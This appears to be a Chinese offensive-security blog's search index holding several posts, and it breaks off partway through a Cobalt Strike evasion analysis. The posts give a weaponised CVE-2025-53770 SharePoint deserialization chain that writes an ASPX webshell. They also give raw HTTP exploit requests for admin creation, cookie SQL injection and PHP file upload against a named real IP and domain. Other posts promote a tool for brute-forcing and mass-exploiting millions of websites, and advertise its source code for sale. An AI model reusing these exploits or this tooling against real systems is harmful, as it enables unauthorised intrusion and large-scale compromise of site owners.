<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>实战CVE-2025-53770漏洞讲解实战坑点并且武器化掉直接集成到我们的webframeworktools实现一键批量getshell展示</title>
      <link href="/securitytools/2025/07/articles/5e8ed1a8f96203bb/"/>
      <url>/securitytools/2025/07/articles/5e8ed1a8f96203bb/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近几天关于CVE-2025-53770 反序列化漏洞在各个公众号群里面讨论。包括在飞机群里面也说这个漏洞可谓是很火。飞机群里面说的是这个漏洞单纯使用ysoserial.exe 生成利用不太可能确实是这样的。里面还包含 xml等。所以这就给实战工作带来了很大困扰。我们知道既然是反序列化漏洞我们必须遵守反序列化的规则既然不能直接生成exp我们可以间接生成exp。通过我在youtube 发布的视频可以知道视频地址<br/><br><a href="https://www.youtube.com/watch?v=gITPNrJpZmE">https://www.youtube.com/watch?v=gITPNrJpZmE</a> <br/><br>要想间接的搞必须要在字节方面下功夫所以我研究了一下最终写出了利用步骤。文章大概说一下。具体去youtube看视频就行了。我大概分为三步进行间接利用。在不破坏原来反序列化的结构从字节方面分析利用过程。不懂的看youtube视频教程。</p><h2 id="1-如何生成powershell利用程序"><a href="#1-如何生成powershell利用程序" class="headerlink" title="(1)如何生成powershell利用程序"></a>(1)如何生成powershell利用程序</h2><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 将脚本内容放入变量中</span><span class="token variable">$script</span> = @<span class="token string">'$base64String = "aaaa"$destinationFile = "C:\PROGRA~1\COMMON~1\MICROS~1\WEBSER~1\16\TEMPLATE\LAYOUTS\ddd.aspx"$decodedBytes = [System.Convert]::FromBase64String($base64String)$decodedContent = [System.Text.Encoding]::UTF8.GetString($decodedBytes)$decodedContent | Set-Content -Path $destinationFile -ErrorAction Stop'</span>@<span class="token comment"># 将脚本内容编码为 Base64</span><span class="token variable">$bytes</span> = <span class="token namespace">[System.Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$script</span><span class="token punctuation">)</span><span class="token variable">$base64Command</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">)</span><span class="token comment"># 输出编码后的 Base64 字符串</span><span class="token variable">$base64Command</span></code></pre><p>上面替换成你自己的文件内容和文件名称。其中文件名称需要遵循<br>文件名称:必须10个字符<br/><br>文件内容: 754个字符<br/><br>具体截图如下:$base64String 必须是754个字符。构造好了以后编码以后。自己再次解码。看看解码以后是否是754个字符。另外文件名称也必须是10个。因为我们是套壳别人的东西所以要遵守规则。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240130501.png" alt="base64String内容"><br>使用powershell 生成 yso 所需要的exp<br>powershell -ExecutionPolicy Bypass -File 1.ps1<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240133565.png" alt="生成base64"><br>测试一下。完成第一步exp构造<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240135250.png" alt="成功标志"></p><h2 id="2-如何使用ysoserial-exe-生成利用代码"><a href="#2-如何使用ysoserial-exe-生成利用代码" class="headerlink" title="(2)如何使用ysoserial.exe 生成利用代码"></a>(2)如何使用ysoserial.exe 生成利用代码</h2><p>使用github最新版本生成exp：<br>ysoserial.exe -o base64 -g 利用链 -f 格式 -c “powershell -EncodedCommand  第一步生成的base64<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240139716.png" alt="使用yso生成exp"><br>我们看到生成的exp以&#x2F;wEywC0AAQAA开头。</p><h2 id="3-如何把yso生成的base64数据变成exp呢"><a href="#3-如何把yso生成的base64数据变成exp呢" class="headerlink" title="(3)如何把yso生成的base64数据变成exp呢"></a>(3)如何把yso生成的base64数据变成exp呢</h2><p>这里涉及到了二进制操作我们可以替换二进制。具体比较复杂我直接写了个利用工具。直接把第二步生成的放到payload.txt里面然后运行工具自动构造exp。<br/>下载地址:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.5-enhance/releases/tag/CVE-2025-53770exptools">https://github.com/peiqiF4ck/WebFrameworkTools-5.5-enhance/releases/tag/CVE-2025-53770exptools</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240143123.png" alt="第二步生成的直接放到工具里面"><br>构造出来以后直接放到burp里面利用就行了。至于返回结果有的是200有的是302。主要是看文件生成没有。最终效果<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240146443.png" alt="exp生成效果"><br>至于exp里面的MSOTlPn_Uri&#x3D;http%3A%2F%2F<a href="http://www.itsc.org/">www.itsc.org</a> 的url可以换成目标的可以原来的不影响直接打就行了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240149453.png" alt="攻击效果"><br>直接上webshell了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240151319.png" alt="webshell"></p><h2 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h2><p>我们直接武器化了。如下图我估计我们是除了漏洞发现者和首次利用者。我们算比较快的直接上webshell的了同时应该也是这个漏洞出来实战比较成功的<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240153621.png" alt="webshell"><br>直接集成到我们的webframeworktools 工具此工具之前已经测试可以跑几百万甚至上千万网站。对源码感兴趣的请看github 频道。只有5.3版本的其他版本的代码暂时不出。以后分享在youtube 和github优先博客次之。频道更次之。不会不懂得看视频教程吧。<br>现在最新版本5.5 增强版本增加 端口扫描 目录扫描 指纹识别 webtitle识别等四个模块。具体看youtube视频吧。</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebFrameworkTools之端口扫描工具PortScan</title>
      <link href="/securitytools/2025/05/articles/3e7baa245191c451/"/>
      <url>/securitytools/2025/05/articles/3e7baa245191c451/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>此前我们开发的工具WebFrameworkTools 专注于exppoc,在渗透实战或者攻防演练中发现信息收集资产收集。特别是进去内网以后的信息收集。尤为重要。用其他的端口扫描工具例如fscan,mascan,nmap这些不是被安全软件标记就是达不到预期的效果。另外这些工具输入的参数太过于复杂对于新手不太友好。我们一贯秉承的原则就是工具能简单绝不搞复杂。另外这些工具有个特点就是只显示扫描成功的结果。这样导致我们无法判断扫描有没有结束,或者是否是软件卡顿等情况。于是我们花了点时间自己开发了一款端口扫描工具。另外我在逛youtube发现有些人使用s扫描器扫描端口开了几个发现太卡了。导致这样的原因是大段批量扫描占用大量cpu内存所以。出现卡顿。具体请看我们的频道吧。接下来我介绍一下我们软件的用法。后续将集成到。WebFrameworkTools里面。</p><h2 id="软件用法介绍"><a href="#软件用法介绍" class="headerlink" title="软件用法介绍"></a>软件用法介绍</h2><p>口扫描工具后续将集成到webframeworktools工具里面这里先单独开一个项目吧</br><br>软件截图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202505311855630.png" alt="端口扫描动态测试截图"><br>端口扫描</br><br>用法: Scan.exe -ip &lt;IP|ip.txt&gt; -port &lt;Port|port.txt&gt; [-thread <Threads>] [-timeout <Timeout>] [-banner &lt;yes|no&gt;] [-type &lt;ping|tcp&gt;] [-export <Port>]</br><br>Author:peiqiF4ck  <a href="https://peiqif4ck.github.io/">https://peiqif4ck.github.io/</a></br><br>ip地址可以是txt文件一行一个也可以是ip地址</br><br>port端口号可以是txt文件一行也可以是端口号</br><br>export(排除的端口号)只能是端口号不支持txt</br><br>ip支持格式:192.168.1.1,192.168.1.1-255,192.168.1.1-192.168.1.255,192.168.1.1,192.168.1.2,192.168.1.1&#x2F;24&#x2F;8&#x2F;16</br><br>端口号支持,和-格式80,81或者81-82.默认端口超时时间为9000。如果输入20以下的数字那么就是9000。否则就是你输入的超时时间。如果想加请指定参数-timeout 10000</br><br>默认使用tcp扫描并且识别banner信息,如果想使用ping探活之后在扫描请加-type指定为ping</br><br>默认线程20更改线程数-thread 100,不识别banner只端口扫描指定参数-banner no </br><br>部分参数用法</br><br>Scan.exe -ip 192.168.1.1 -port 80 -thread 100 -timeout 9000 -banner no -type ping -export 80</br><br>Scan.exe -ip 192.168.1.1 -port 80 -thread 100 </br><br>Scan.exe -ip 192.168.1.1 -port 80  -timeout 9000</br><br>Scan.exe -ip 192.168.1.1 -port 80  -type ping</br><br>Scan.exe -ip 192.168.1.1</br><br>Scan.exe -ip ip.txt -port port.txt</br><br>端口扫描<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202505311630321.gif" alt="端口扫描动态测试截图"></p><p>视频教程<br><a href="https://www.youtube.com/watch?v=W3aJ4n5u0jg">https://www.youtube.com/watch?v=W3aJ4n5u0jg</a></br></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透攻击第一步就是信息探测。探测哪些端口开放作为入侵的首选。所以有个趁手的端口扫描工具很有必要就这吧。其他请看视频教程。另外端口扫描的代码后续也会出的。后续请多多关注频道。</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某h5商城漏洞探究外加源码</title>
      <link href="/penetrationtest/2025/04/articles/aaca2e7fa3565312/"/>
      <url>/penetrationtest/2025/04/articles/aaca2e7fa3565312/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻笔记翻到了去年7月份搞的站点,这个漏洞忘了从哪里看到的了我稍微加工了加工。现在公布出来。这个漏洞简单方便学习代码审计。闲话不多说直接放exp。由于是去年的漏洞现在网站已经关闭图片没有马赛克直接一镜到底。低调使用。请勿使用漏洞非法攻击网站。发布源代码仅提供学习研究。不要使用公开的exp攻击互联网网站。</p><h2 id="添加管理员"><a href="#添加管理员" class="headerlink" title="添加管理员"></a>添加管理员</h2><pre class="language-sh" data-language="sh"><code class="language-sh">POST &#x2F;admin&#x2F;api.php HTTP&#x2F;1.1Host: 1.117.76.188:88Content-Length: 135Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8Origin: http:&#x2F;&#x2F;1.117.76.188:88Referer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;admin&#x2F;wz_sz&#x2F;adminSet.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: keep-aliveadmin&#x3D;true&amp;name&#x3D;%E8%B4%BA%E5%AE%87%E5%B9%B2%E9%B2%9C&amp;username&#x3D;admin123&amp;password&#x3D;admin123456&amp;pwd&#x3D;admin123456&amp;qq&#x3D;31393231&amp;wx&#x3D;152485399612</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011518752.png" alt="测试截图"></p><h2 id="后台cookie注入"><a href="#后台cookie注入" class="headerlink" title="后台cookie注入"></a>后台cookie注入</h2><pre class="language-shell" data-language="shell"><code class="language-shell">GET &#x2F;admin&#x2F;index.php?id&#x3D;user HTTP&#x2F;1.1Host: 1.117.76.188:88Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: username&#x3D;admin&#39;+or+true#Connection: keep-aliveReferer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;admin&#x2F;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011521502.png" alt="测试截图"></p><h2 id="文件上传一"><a href="#文件上传一" class="headerlink" title="文件上传一"></a>文件上传一</h2><pre class="language-sh" data-language="sh"><code class="language-sh">POST &#x2F;admin&#x2F;commodtiy&#x2F;file.php?upload&#x3D;1 HTTP&#x2F;1.1Host: 1.117.76.188:88Content-Length: 405Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryHA1b60Dgi0g9WBtfOrigin: http:&#x2F;&#x2F;1.117.76.188:88Referer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;user&#x2F;Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: keep-alive------WebKitFormBoundaryHA1b60Dgi0g9WBtfContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.png&quot;Content-Type: image&#x2F;pngdfffs------WebKitFormBoundaryHA1b60Dgi0g9WBtf--</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011525605.png" alt="测试截图"><br>上传成功返回 “/admin/commodtiy/upload/xxxxxxx.php”</p><h2 id="文件上传二"><a href="#文件上传二" class="headerlink" title="文件上传二"></a>文件上传二</h2><pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;file.php HTTP&#x2F;2Host: qiminggay.icuCookie: yzm&#x3D;FFB8Content-Length: 426Sec-Ch-Ua: &quot;Chromium&quot;;v&#x3D;&quot;122&quot;, &quot;Not(A:Brand&quot;;v&#x3D;&quot;24&quot;, &quot;Google Chrome&quot;;v&#x3D;&quot;122&quot;Sec-Ch-Ua-Platform: &quot;Windows&quot;Sec-Ch-Ua-Mobile: ?0User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryNDfqoHwYfPZ51LSAAccept: *&#x2F;*Origin: https:&#x2F;&#x2F;qiminggay.icuSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https:&#x2F;&#x2F;qiminggay.icu&#x2F;admin&#x2F;commodtiy&#x2F;index.php?page&#x3D;1Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9------WebKitFormBoundaryNDfqoHwYfPZ51LSAContent-Disposition: form-data; name&#x3D;&quot;wangeditor-uploaded-image&quot;; filename&#x3D;&quot;test.php&quot;Content-Type: image&#x2F;pngdfdsafsfsad------WebKitFormBoundaryNDfqoHwYfPZ51LSA--</code></pre><p>上传成功后返回<br>{<br>    “errno”:0,<br>    “data”:{<br>        “url”:”&#x2F;upload&#x2F;xxxxx.php”,<br>        “alt”:” “,<br>        “href”:” “<br>    }<br>}</p><p>另外会提供这个h5商城的源代码。供代码审计学习。关于代码审计学习如何能独立审计代码。首先学习代码审计需要学习基础语言。这样可以审计简单的漏洞。后续在研究框架漏洞渗透测试。如果对框架审计有浓厚的兴趣可以后续。对框架漏洞进行研究不推荐因为耗时。并且需要深厚的功力。达到可以通过补丁diff出exp就行了。能达到这个水平也很牛逼了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近AI比较火比如deepseek什么的有人说可以结合ai对代码进行审计。目前来说可能效果并不是好的但是后续看肯定是没问题的。有需要了解ai审计的可以在github中寻找代码审计的项目star以后看看。总的来说ai是辅助你干活并不能全部代替你去干活。后续等ai发展起来你自己的审计功底也有了那就是如虎添翼。结合批量工具可以编写自己的exp poc工具。搭载几百万甚至上千万网站进行漏洞扫描。结合0day和xday那你将在你的领域发光发热。不会编程的建议加紧学习。靠ai不行你让ai给你写个搭在几百万上千万的exp poc框架不可能。它只能给你优化。这个东西就像地基一样打好地基你的房子才能盖的结实。所以不要靠它给你打地基。如果有现成的源代码你可以直接进行修改站在巨人的肩膀上面。在github上面物色比较靠谱的项目。经过ai的打磨。然后自己审计0day和集成xday那将在一个领域无敌。拿到的站点进行代码审计扩大战果。这个h5是通过渗透测试方式拿到代码。有些漏洞是通过代码审计方式审计出来的。后续集成到你自己的工具上面那会很强大。所以重视起来代码审计。<br>代码下载链接:<br><a href="https://t.me/SoftwareNoticeChannel/856">https://t.me/SoftwareNoticeChannel/856</a></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用软件源代码编写phpmyadmin爆破模块以及实战5W网站测试</title>
      <link href="/securitytools/2025/03/articles/1c4bc90eceabb786/"/>
      <url>/securitytools/2025/03/articles/1c4bc90eceabb786/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>为了使购买源代码的用户提前熟悉源码和展示工具的性能。我们特意录制了获取到源代码以后如何进行简单的post get 上传 添加自定义 http请求头。这个前面两期视频教程已经说了<br/><br>1:简单的get post 上传 代码编写基础 <br/><br><a href="https://www.youtube.com/watch?v=VIjLxEuc9JM">https://www.youtube.com/watch?v=VIjLxEuc9JM</a> <br><br>2: post请求简单实战编写<br/><br><a href="https://youtu.be/otU2-ig3Nb8?si=tL3VacTYOYQSFg1a">https://youtu.be/otU2-ig3Nb8?si=tL3VacTYOYQSFg1a</a><br/><br>3: exp poc实战之phpmyadmin爆破模块开发以及实战演示5万网站使用默认账号密码进行爆破教程地址:<br/><br> <a href="https://www.youtube.com/watch?v=ujL5HHe3hZs">https://www.youtube.com/watch?v=ujL5HHe3hZs</a> </p><p>其中二和三位实战测试我们重点来看一下phpmyadmin 实战<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202503061439710.png" alt="实战爆破结果"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202503061440860.png" alt="工具爆破结果"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202503061441549.png" alt="实战爆破结果"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们以前看类似phpmyadmin 这种工具图形化的写出来比较高大尚但是这我们这里。只要你会写单个的批量直接集成就行了。很简单。让以前你觉得很牛逼的工具瞬间变成平平无奇的工具。以前牛逼的工具在我们这里就是一个模块或者一个分支。并且我们的工具最少可以搭载百万条网站甚至是上千万条网站。学好功力大增如果遇到不会的我们会在群里培训写出exp你们去照着写手把手教。后续你们只需要考虑代码审计和0day 有xday直接自己集成。</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webframeworktools-1000万条网站测试成功</title>
      <link href="/securitytools/2025/01/articles/e9c8349d34c76c05/"/>
      <url>/securitytools/2025/01/articles/e9c8349d34c76c05/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在去年2024年7月份我们开始针对软件性能进行测试到。2024年12月软件测试完毕。总耗时将近4个月软件在1000万条url表现很好。跑了将近4个月没有出现奔溃现象。软件表现很不错。</p><h2 id="软件测试详细参数"><a href="#软件测试详细参数" class="headerlink" title="软件测试详细参数"></a>软件测试详细参数</h2><p>在软件将近4个月测试下软件表现很好测试没有崩溃。并且已经测试完毕。已知bug已经全部修复。稳定性没有任何问题。测试详情如下:<br>测试结束日期2024-12-23 结束时间 10:00<br>测试网站条数1000万条<br>全模块(除了log4j weblogic jboss 这个三个模块)耗时将近4个月测试完毕。<br>堪称完美测试。测试总流量7.3093TB。软件下载流量6.256TB。上传流量 1.053TB。这标志着我们软件在1000万网站的url下表现很完美。<br>接下来会对漏洞进行优化避免出现误报情况。😏😏😏😏😏😏。然后以后我们将专注漏洞。漏洞越多越好。<br>因为数量上已经足够了我们最起码可以自动化攻击1000万个网站。。<br>测试详细参数<br>测试cpu Intel(R) Xeon(R) CPU E5-2670 0 @ 2.60GHz   2.60 GHz  (2 个处理器) DDR3<br>服务器 Windows Server 2022 Standard Evaluation 21H2<br>操作系统:64位操作系统,基于x64 的处理器<br>内存:32.0GB<br>下载速度:1-2MB&#x2F;s 我们是用事实说话从来不说我们的软件牛逼。市面上可以承载百万,千万url不奔溃的少之又少。所以后续是集成越来越多漏洞。现在缺的就是漏洞和时间更多的是缺时间哈哈哈。现在是就差漏洞了。批量全球没有任何问题。鉴于软件危害巨大我们将后续着手关注源代码请感兴趣的准备好编程知识和$。我们将毫无保留的出最新版本源代码1000w url测试的😏。我们的一贯宗旨就是talking is cheap show me your code。遵循着实战就是真理。目前在exp poc这个领域能跑千万的软件我想是没有的。有源代码能写出其他软件稍微改改就行了<br>测试截图1<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201452329.png" alt="测试截图1"><br>测试截图2<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201452331.png" alt="测试截图2"><br>测试截图3<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201452799.png" alt="测试截图3"><br>测试截图4<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201453499.png" alt="测试截图4"></p><h2 id="软件视频教程"><a href="#软件视频教程" class="headerlink" title="软件视频教程"></a>软件视频教程</h2><p>软件使用视频教程<br>webframeworktools5.0 使用教程<br><a href="https://www.youtube.com/watch?v=TXG7W9WnbiI">https://www.youtube.com/watch?v=TXG7W9WnbiI</a> <br/><br>webframeworktools5.1 DLL生成器使用<br/><br><a href="https://www.youtube.com/watch?v=IkhE4cNVNso">https://www.youtube.com/watch?v=IkhE4cNVNso</a> <br/><br>webframeworktools5.1 自写dll教程。使用内部封装函数编写上传功能代码。上传内容使用内部封装函数可以转换任意文件内容。编写进行上传操作。内部代码不公开仅做演示操作。其他简单的编写可以去博客看get post的教程。简单的可以直接一键生成exp<br/><br><a href="https://www.youtube.com/watch?v=aLznRaoG_b4">https://www.youtube.com/watch?v=aLznRaoG_b4</a>  <br/><br>webframeworktools5.2 ini配置教程<br><a href="https://www.youtube.com/watch?v=DlupWCAbBgg">https://www.youtube.com/watch?v=DlupWCAbBgg</a>       <br/><br>                                视频教程已出。不会的自行学习。旧版本自写dll存在bug。如果没有输出结果属于正常。后续版本将纠正这个bug<br><a href="https://peiqif4ck.github.io/securitytools/2024/01/articles/1fee187af88e0843/">https://peiqif4ck.github.io/securitytools/2024/01/articles/1fee187af88e0843/</a>    WebFrameworkTools5.2 ini工具使用方法<br/><br><a href="https://peiqif4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/#toc-heading-3">https://peiqif4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/#toc-heading-3</a>   dll exp编写教程<br/><br><a href="https://peiqif4ck.github.io/securitytools/2024/10/articles/039303a532fb37a7/">https://peiqif4ck.github.io/securitytools/2024/10/articles/039303a532fb37a7/</a>  webframeworktools dll模式简单批量使用<br/><br><a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a>   github地址  软件内置exp使用 方法更新<br/><br><a href="https://github.com/peiqiF4ck/ToolsUserDllplugin">https://github.com/peiqiF4ck/ToolsUserDllplugin</a>  dll编写教程</p><h2 id="授人以鱼不如授人以渔"><a href="#授人以鱼不如授人以渔" class="headerlink" title="授人以鱼不如授人以渔"></a>授人以鱼不如授人以渔</h2><p>有人老询问软件说软件攻防中url条数不够用。所以这次我们修改了一下url条数为10万条。中国大陆地区不可使用。使用请遵守法律法规。由于之前发布的软件被平台删除了所以我们在此补发一下软件下载地址。对于基础好的人不满足使用软件。或者自己有exp 或者0day漏洞缺少可以跑几千万上百万的软件框架。由于软件是免费的加上内地对网络安全越来越严格后续我们将不在对软件exp poc进行更新。你们自己购买源代码以后自己可以修改。源码分三批次发放。取决于大部分兄弟们的学习进度。综上所述:<br/><br>我们决定在2025年对软件源代码正式开售。软件具备千万级攻击能力。我们将对源代码购买人数做限制目前限制人数50人。50人出完我们将不在进行售卖。详情请看频道<a href="https://t.me/SoftwareNoticeChannel/775">https://t.me/SoftwareNoticeChannel/775</a> </p><h2 id="软件下载地址"><a href="#软件下载地址" class="headerlink" title="软件下载地址"></a>软件下载地址</h2><p><a href="https://www.upload.ee/files/17648235/WebFrameworkTools-10w.zip.html">https://www.upload.ee/files/17648235/WebFrameworkTools-10w.zip.html</a><br/><br>下载后请核对软件目录。注意发布版本为2024-08-31 不是最新版本。请勿对号入座。在youtube做的视频是最新版本。由于授权问题暂时发布不了。后续可能不会发布。在upload ee发布的软件除了自写dll有bug和dll生成器某些存在bug外。其他已知bug均修复完毕。想要源代码的特别要对软件使用方式要熟悉。视频和文字教程这些都已经发布。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201505486.png" alt="软件目录"></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.9.1-生成stageless的exe为何会被杀以及生成原理(三)</title>
      <link href="/penetrationtest/2025/01/articles/c2ed6fd0c8eb2a80/"/>
      <url>/penetrationtest/2025/01/articles/c2ed6fd0c8eb2a80/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面两篇已经说了cs 破解和cs windows stager生成原理这篇我们来通过windows 生成stageless来看谈杀软的查杀点。为什么免杀需要配合profile进行免杀。和修改beacon特征来对抗杀软。</p><h2 id="stagerless-分析"><a href="#stagerless-分析" class="headerlink" title="stagerless 分析"></a>stagerless 分析</h2><p>  我们来到 windows stageless payload 生成按钮这里<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241029821.png" alt="生成"><br>对应代码位置<br>  src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableStageDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WindowsExecutableStageDialog</span><span class="token punctuation">(</span><span class="token class-name">AggressorClient</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stagelesss对话框:"</span> <span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>client <span class="token operator">=</span> var1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241032625.png" alt="打印出关键类"><br>我们点击generate 的时候触发<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241032166.png" alt="点击generate"><br>对应代码如下:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dialogAction</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> var1<span class="token punctuation">,</span> <span class="token class-name">Map</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless dialogAction Method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> var2<span class="token punctuation">;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"stage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"x64"</span> <span class="token operator">:</span> <span class="token string">"x86"</span><span class="token punctuation">;</span><span class="token class-name">String</span> var5 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token 